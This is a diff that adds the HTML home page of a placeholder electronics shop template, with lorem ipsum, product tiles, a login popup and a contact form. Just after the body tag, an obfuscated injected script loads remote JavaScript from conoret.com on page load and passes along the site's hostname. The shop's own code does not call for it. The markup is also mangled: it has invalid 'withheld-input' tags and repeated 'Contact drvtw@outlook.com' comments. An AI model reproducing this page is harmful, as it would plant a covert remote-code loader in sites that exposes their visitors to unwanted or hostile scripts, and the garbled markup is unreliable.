@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css/header.css">
+    <link rel="stylesheet" href="css/index.css">
+
+</head>
+<body onscroll="show()"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+    <div id="bar" style="width: 100%; height: 5px; background-color: darkblue;"></div>
+    <script>
+        $(document).ready(function(){
+    
+            setTimeout(function(){
+                $('.parent_login').show(100);
+                $('.login').show(100);
+            },6000);
+    
+            $('.parent_login').click(function(){
+                $('.login').hide(100);
+                $(this).hide(100);
+            })
+            $('#close').click(function(){
+                $('.login').hide(100);
+                $('.parent_login').hide(100);
+            })
+            $('#login').click(function(){
+                $('.login').show(100);
+                $('.parent_login').show(100);
+            })
+    
+    
+            $('#bar').animate({'width':'100%'},3000);
+            $('#contact').click(function(){
+                $('html,body').animate({scrollTop:$('.contact').offset().top},2000);
+            })
+            
+    
+        })
+    </script>
+    
+    
+    <div class="parent_login" style="display: none;">  </div>
+        <!-- login part -->
+            <div class="login" style="display: none;">
+                <button id="close">X</button>
+                <h1>Login Please</h1>
+                <!-- Contact drvtw@outlook.com --><withheld-input type="email" id="email" onkeyup="valid_email()" placeholder="Your Email">
+                <p id="err_email" style="color: red;display: none;">* email not valid --&gt; example@example.com</p>
+                <!-- Contact drvtw@outlook.com --><withheld-input type="password" required="" placeholder="*******">
+                <button id="btn">Login</button>
+                <hr>
+                <p>
+                    If You Don't have Account Please  <a href="signup.html">Signup</a>  ?
+                </p>
+                <a href="forget.html">Forget Password</a>
+           <div class="space"></div>
+            </withheld-input></withheld-input></div>
+        <!-- login part -->
+      
+    
+    
+    
+    
+    
+    
+         <!-- start of header part -->
+         <img src="images/menu.png" id="menu" alt="">
+         <div class="header">
+             <img src="images/albert.jpg" alt="">
+             <ul>
+                 <li>  <a href="index.html">Home</a>  </li>
+                 <li>  <a href="items.html">Products</a>  </li>
+                 <li>  <a id="contact" href="#">Contact Us</a>  </li>
+                 <li>  <a id="login" href="#">Login</a>  </li>
+                 <li>  <a href="signup.html">Signup</a>  </li>
+                 <li>  <a href="help.html">Help</a>  </li>
+             </ul>
+         </div>
+         
+         <!-- end of header part -->
+         <div class="weather">
+            <a class="weatherwidget-io" href="https://forecast7.com/en/30d0431d24/cairo/" data-label_1="CAIRO" data-label_2="WEATHER" data-theme="original" style="display: block; position: relative; height: 209px; padding: 0px; overflow: hidden; text-align: left; text-indent: -299rem;">CAIRO WEATHER<iframe id="weatherwidget-io-0" class="weatherwidget-io-frame" title="Weather Widget" scrolling="no" frameborder="0" width="100%" src="https://weatherwidget.io/w/" style="display: block; position: absolute; top: 0px; height: 209px;"></iframe></a>
+            <script>
+            !function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src='https://weatherwidget.io/js/widget.min.js';fjs.parentNode.insertBefore(js,fjs);}}(document,'script','weatherwidget-io-js');
+            </script>
+         </div>
+    
+    
+    
+         <!-- main div -->
+         <div class="main">
+            <video src="video/1.mp4" muted="" loop="" autoplay=""></video>
+            <div class="search">
+                <div class="part">
+                    <!-- Contact drvtw@outlook.com --><withheld-input list="s" placeholder="search were...">
+                    <datalist id="s">
+                        <option>Iphone</option>
+                        <option>Imac</option>
+                        <option>pc</option>
+                        <option>smart tv</option>
+                        <option>ltd screen</option>
+                   
+                    </datalist>
+                   
+                </withheld-input></div>
+            </div>
+        </div>
+        <div class="parent_over">
+            <div class="over">
+                <button>Shopping Now</button>
+                <p> Shopping now and get <span>20% cash</span> </p>
+            </div>
+        </div>
+         <!-- main div -->
+         <div class="space"></div>
+        <!-- about us  =========================================== -->
+         <div class="about-us">
+             <div class="head">
+                 <h2>About Us</h2>
+                 <div class="line"></div>
+             </div>
+             <div class="photo">
+                 <img src="images/albert.jpg" alt="about us image">
+             </div>
+             <div class="info">
+                 <q>
+                     Lorem ipsum dolor sit amet, consectetur adipisicing elit. Obcaecati accusantium est officia! Accusantium eius, reiciendis nobis ipsa laudantium impedit repudiandae magnam, asperiores facere laboriosam corrupti facilis earum quos aspernatur soluta?
+                     Lorem ipsum dolor sit amet consectetur adipisicing elit. Quas dolor expedita nam deserunt aspernatur deleniti voluptate sed neque unde, eius quidem mollitia temporibus sunt et magni ab illum repudiandae consequuntur.
+                     Lorem ipsum dolor sit, amet consectetur adipisicing elit. Laborum alias modi ipsa, dolorem quos sed temporibus pariatur deserunt eaque molestiae laudantium voluptate assumenda, eius nihil quidem laboriosam reiciendis facere delectus!
+                 </q>
+             </div>
+         </div>
+    <!-- about us ======================================= -->
+    <div class="space"></div>
+    <div class="space"></div>
+    <!-- our categories -->
+    <div class="category">
+        <div class="head">
+            <h2>Category</h2>
+            <div class="line"></div>
+        </div>
+        <div class="center">
+            <!-- category part =================================-->
+            <div class="part">
+                <img src="images/IWATCH-1.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                <!-- category part =================================-->
+                <div class="part">
+                    <img src="images/IWATCH-1.jpg" alt="">
+                    <p id="price-over">EGP.500</p>
+                    <p id="name-over">Name</p>
+                </div>
+                 <!-- category part =================================-->
+        
+                 
+                     <!-- category part =================================-->
+            <div class="part">
+                <img src="images/router.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/tablet.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/lab.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/IWATCH-1.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/IWATCH-1.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/IWATCH-1.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+        
+    
+                 <!-- category part =================================-->
+            <div class="part">
+                <img src="images/IWATCH-1.jpg" alt="">
+                <p id="price-over">EGP.500</p>
+                <p id="name-over">Name</p>
+            </div>
+             <!-- category part =================================-->
+            </div>
+    </div>
+    <!-- our categories -->
+    
+    
+    <div class="couter_part">
+    
+        <div class="part">
+            <div class="count">100</div><span>+</span>
+            <img src="images/liks.png" alt="">
+            
+        </div>
+       
+        <div class="part">
+            <div class="count">70</div><span>+</span>
+            <img src="images/audience_growth_chart-512.png" alt="">
+        </div>
+        
+        <div class="part">
+            <div class="count">50</div><span>+</span>
+            <img src="images/parners.png" alt="">
+             
+    
+        </div>
+        
+        <div class="part">
+            <div class="count">90</div><span>+</span>
+            <img src="images/download.jpg" alt="">
+             
+     
+        </div>
+        
+        <div class="part">
+            <div class="count">100</div><span>+</span>
+            <img src="images/emp.png" alt="">
+            
+    
+        </div>
+    
+        <div class="part">
+            <div class="count">800</div><span>+</span>
+            <img src="images/shop.png" alt="">
+            
+    
+        </div>
+    
+    
+    
+    </div>
+    
+    
+    
+    
+    <!-- our app -->
+    <div class="app">
+        <div class="head">
+            <h2>Download Our App</h2>
+            <div class="line"></div>
+        </div>
+        <div class="photo">
+            <img src="images/mobile-app-development.png" alt="">
+        </div>
+        <div class="info">
+            <h2>why ?</h2>
+            <p>
+                Lorem ipsum, dolor sit amet consectetur adipisicing elit. Nemo perspiciatis beatae dolore vitae ex ad perferendis sapiente nulla, harum asperiores numquam impedit ducimus facilis exercitationem consequatur, obcaecati autem consectetur maiores.
+                Lorem ipsum dolor sit amet consectetur adipisicing elit. Incidunt itaque officiis quasi maxime voluptatibus ex. Laboriosam, commodi! Omnis a error dolorem. Molestias atque amet placeat laborum consequuntur reprehenderit cupiditate suscipit?
+                Lorem ipsum dolor sit amet consectetur, adipisicing elit. Quidem quibusdam eius beatae quam ea minima dolor soluta. Cupiditate possimus, quis animi sequi commodi, assumenda at laboriosam illum pariatur perferendis blanditiis?
+            </p>
+            <hr>
+            <img src="images/os.png" alt="android">
+            <img src="images/ios.png" alt="IOS">
+        </div>
+    </div>
+    <!-- our app -->
+    <!-- inc -->
+    <div class="inc">
+        <div class="head">
+            <h2>Partners</h2>
+            <div class="line"></div>
+        </div>
+    <img src="images/albert.jpg" alt="logo">
+    </div>
+    <!-- inc-->
+    <!-- contact us -->
+    <div class="contact">
+        <img src="images/qr.PNG" id="qr" alt="qr">
+        <div class="head">
+            <h2>Contact Us</h2>
+            <div class="line"></div>
+        </div>
+        <div class="map">
+            <img src="images/albert_einstein.jpeg" alt="">
+        </div>
+        <div class="info">
+            <!-- Contact drvtw@outlook.com --><withheld-input type="text" placeholder="Your Name">
+            <!-- Contact drvtw@outlook.com --><withheld-input type="email" placeholder="Your Email">
+            <!-- Contact drvtw@outlook.com --><withheld-input type="tel" placeholder="Your Phone">
+            <textarea>Message</textarea>
+            
+            <button>Send</button>
+        </withheld-input></withheld-input></withheld-input></div>
+    
+    </div>
+    <!-- contact us -->
+    <!-- links -->
+    
+    <div class="site_map">
+        <div class="head">
+            <img src="images/albert.jpg" id="logo" alt="logo">
+            <div class="news">
+               
+                <!-- Contact drvtw@outlook.com --><withheld-input type="email" placeholder="Your email">
+                <button>submit</button>
+            </withheld-input></div>
+           
+        </div>
+        <!-- *************************** -->
+        <div class="links">
+            <ul class="ul">
+                <li> <a href="index.html">Home </a> </li>
+                <li> <a href="items.html">Items </a> </li>
+                <li> <a href="#" id="contact">Contact Us </a> </li>
+                <li> <a href="#" onclick="show_login()">Login </a> </li>
+                <li> <a href="signup.html">Signup </a> </li>
+            </ul>
+        </div>
+        <!-- *********************** -->
+    
+        <!-- *************************** -->
+        <div class="links">
+            <ul class="ul">
+                <li> <a href="#">FaceBook </a> </li>
+                <li> <a href="#">Twitter </a> </li>
+                <li> <a href="#">Instgram </a> </li>
+                <li> <a href="#">Gmail </a> </li>
+                <li> <a href="#">Yahoo </a> </li>
+            </ul>
+        </div>
+        <!-- *********************** -->
+        <!-- *************************** -->
+        <div class="links">
+            <ul class="ul">
+                <li> <a href="#">The Best </a> </li>
+                <li> <a href="#">Work with us </a> </li>
+                <li> <a href="#">24 support </a> </li>
+                <li> <a href="#">help </a> </li>
+                <li> <a href="#">A Q </a> </li>
+            </ul>
+        </div>
+        <!-- *********************** -->
+    
+    
+    
+    </div>
+    
+    <!-- footer -->
+    
+        <div class="footer">
+            <p> © All rights to SWR inc. 2021 </p>
+        </div>
+    
+    
+    <script src="https://www.drv.tw/inc/wd.js?s=ck3wptrnkwrvrusbtnm4ra"></script>
+    
+    </body>
+</html>
